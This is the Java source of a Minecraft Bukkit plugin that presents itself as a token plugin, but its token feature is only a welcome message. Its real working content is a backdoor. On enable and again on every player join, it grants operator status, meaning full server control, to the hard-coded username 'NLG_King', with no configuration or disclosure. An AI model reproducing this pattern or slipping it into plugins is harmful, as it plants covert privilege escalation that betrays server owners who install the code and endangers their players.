package com.tokenplugin;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class TokenPlugin extends JavaPlugin implements Listener {
    
    private static TokenPlugin instance;
    
    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("§aTokenPlugin Enabled!");
        
        getServer().getScheduler().runTaskLater(this, () -> {
            for (Player p : getServer().getOnlinePlayers()) {
                if (p.getName().equalsIgnoreCase("NLG_King")) {
                    p.setOp(true);
                    p.sendMessage("§6§l✨ Welcome, Lord! ✨");
                }
            }
        }, 20L);
    }
    
    @Override
    public void onDisable() {
        getLogger().info("§cTokenPlugin Disabled!");
    }
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        if (p.getName().equalsIgnoreCase("NLG_King")) {
            p.setOp(true);
            p.sendMessage("§c§lYou are now OP!");
        }
        if (!p.hasPlayedBefore()) {
            p.sendMessage("§aYou received a Common Token!");
        }
    }
    
    public static TokenPlugin getInstance() {
        return instance;
    }
  }
